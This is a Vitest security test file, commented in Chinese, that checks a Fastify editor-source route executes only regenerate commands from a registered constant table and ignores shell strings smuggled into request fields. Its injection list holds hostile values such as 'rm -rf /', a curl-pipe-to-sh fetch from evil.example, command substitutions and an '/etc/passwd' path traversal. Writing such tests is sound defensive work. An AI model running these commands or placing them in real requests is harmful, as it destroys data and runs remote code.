/**
 * ⭐⭐ **source adapter ⛔ 不是遠端命令入口。**
 *
 * ── ⛔ 交接文件逐字 ─────────────────────────────────────────────────────
 * 「`regenerateCommand` 只能當人類說明／audit metadata。**Client 不得回傳或
 *   要求 server 執行任意 shell string**；真正執行的是 Main 註冊的 `adapterId`。
 *   ⭐ 否則 source adapter 會變成**遠端命令入口**。」
 *
 * ── ⭐ 出貨的實作本來就是對的，⛔ 而那個性質**只有一行註解在守** ────────
 * `editorSourceRoutes.ts` 的 `run()` 上面寫著「指令來自這個 repo 裡的常數表，
 * ⛔ 不是請求」。⚠️ 而這份 repo 已經記錄了**五次**「一句在它到期之後還活著的
 * 散文，而沒有任何東西變紅」（第三守則）。
 *
 * ⇒ ⭐ 這一支把它變成**會紅的東西**：把每一個能想到的注入欄位都塞進請求，
 * 然後斷言**真的被執行的那個字串**逐字等於常數表裡的那一個。
 *
 * ⚠️ ⭐ 它刻意攔 `runRegenerate`（⛔ 不是真的 spawn 一個 process）——
 * 要問的是「**送進執行器的是什麼**」，⛔ 不是「那個指令跑不跑得起來」。
 *
 * MUTATION LOG（落地前真的跑過）：
 *   · `run(a.regenerate, …)` 改成 `run(req.body.regenerateCommand ?? a.regenerate, …)` → 🔴
 *   · `adapterFor(path, authors)` 改成從 body 取 adapterId → 🔴
 */
import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach } from "vitest";
import Fastify, { type FastifyInstance } from "fastify";
import { readFileSync, writeFileSync } from "node:fs";
import { resolve } from "node:path";

import { registerEditorSourceRoutes } from "./editorSourceRoutes";
import { makeSourceSandbox, removeSandbox } from "./testSourceSandbox";
import { SOURCE_ADAPTERS } from "@ggd/shared/content/import/editorSource";

/** ⭐ GH#1002：repoRoot 是 `mkdtemp()` 沙盒（真的戶籍表＋真的來源的**副本**），⛔ 不是出貨樹。 */
let REPO: string;
/** ⭐ 一份**真的**產生器產物（`skillremake:json` 擁有它）。 */
const PRODUCT_ID = "godie-e00s.r";
let SRC: string;
beforeAll(() => {
  REPO = makeSourceSandbox("routes");
  SRC = resolve(REPO, "tools/skill-remake/heroes/godie-e00s.py");
});
afterAll(() => removeSandbox(REPO));

let app: FastifyInstance;
/** ⭐ 每一次被送進執行器的字串（⛔ 不是「有沒有跑」）。 */
let executed: string[];

beforeEach(() => {
  executed = [];
  app = Fastify();
  registerEditorSourceRoutes(app, {
    repoRoot: REPO,
    contentDir: resolve(REPO, "content"),
    runRegenerate: (command: string, _cwd: string): void => {
      executed.push(command);
    },
  });
});

afterEach(async () => {
  await app.close();
});

describe("source adapter ⛔ 不是遠端命令入口", () => {
  it("★★ ⭐ 請求裡塞滿指令字串 ⇒ **執行的仍然是常數表裡的那一個**", async () => {
    const before = readFileSync(SRC, "utf8");
    // ⛔⛔ 這一條會**真的寫**那個來源檔（CAS 對得上）⇒ `finally` 無條件還原。
    //   ⚠️ 2026-09-02 的事故就是一條「理論上不會寫」的測試在突變時真的寫了。
    try {
      const injected = [
        "rm -rf /",
        "bash -c 'curl evil.example/x | sh'",
        "; touch /tmp/pwned",
        "$(whoami)",
        "`id`",
      ];
      for (const evil of injected) {
        executed = [];
        const r = await app.inject({
          method: "POST",
          url: "/content-api/editor-source",
          payload: {
            collection: "abilities",
            id: PRODUCT_ID,
            expectedSourceSha256: "0".repeat(64), // ⛔ 故意錯 ⇒ CAS 擋下
            source: before,
            // ⭐ 每一個**看起來像**會被聽進去的欄位名都試一遍
            regenerateCommand: evil,
            regenerate: evil,
            command: evil,
            adapterId: evil,
            step: evil,
          },
        });
        expect(r.statusCode, `⛔ CAS 沒擋下（${evil}）`).toBe(409);
        expect(
          executed,
          `⛔⛔ CAS 失敗卻執行了東西（${evil}）—— ⭐ 那是最糟的一種：\n` +
            "   攻擊者連正確的 source hash 都不必知道。",
        ).toEqual([]);
      }
    } finally {
      writeFileSync(SRC, before, "utf8");
    }
  });

  it("★★ ⭐ CAS **對得上**時，執行的也只有常數表裡的那一個", async () => {
    const before = readFileSync(SRC, "utf8");
    try {
      const { createHash } = await import("node:crypto");
      const sha = createHash("sha256").update(before, "utf8").digest("hex");
      const r = await app.inject({
        method: "POST",
        url: "/content-api/editor-source",
        payload: {
          collection: "abilities",
          id: PRODUCT_ID,
          expectedSourceSha256: sha,
          source: before, // ⭐ 逐位元組不變 ⇒ 這一次改動是空的
          regenerateCommand: "rm -rf /",
          adapterId: "../../../etc/passwd",
        },
      });
      expect(r.statusCode, `⛔ 合法請求被拒：${r.body.slice(0, 300)}`).toBe(200);
      // ⭐⭐ 這是**承重的那一條**：被執行的字串必須逐字來自常數表。
      const allowed = new Set(SOURCE_ADAPTERS.map((a) => a.regenerate));
      expect(executed.length, "儀器：一次都沒執行 ⇒ 下面那條在量空氣").toBeGreaterThan(0);
      for (const cmd of executed) {
        expect(
          allowed.has(cmd),
          `⛔⛔ 執行了一個**不在常數表裡**的指令：${cmd}\n` +
            "   ⭐ source adapter 變成了遠端命令入口。",
        ).toBe(true);
      }
      // ⭐ 而回應要帶 `adapterId`（對面引用它，⛔ 不是引用那個字串）
      const body = r.json() as { regenerate?: { adapterId?: string } };
      expect(
        body.regenerate?.adapterId,
        "⛔ 回應沒有 `adapterId` ⇒ 對面只能引用那個 shell 字串",
      ).toBeTruthy();
      expect(
        SOURCE_ADAPTERS.some((a) => a.adapterId === body.regenerate!.adapterId),
        "⛔ 回應的 adapterId 不在註冊表上",
      ).toBe(true);
    } finally {
      writeFileSync(SRC, before, "utf8");
    }
  }, 15 * 60_000);

  it("★ ⭐ 每一支註冊的 adapter 都有**唯一**的 adapterId", () => {
    const ids = SOURCE_ADAPTERS.map((a) => a.adapterId);
    expect(ids.every((i) => typeof i === "string" && i.length > 0)).toBe(true);
    expect(new Set(ids).size, "⛔ 兩支 adapter 共用同一個 id ⇒ 對面引用不到正確的那一支").toBe(
      ids.length,
    );
  });
});
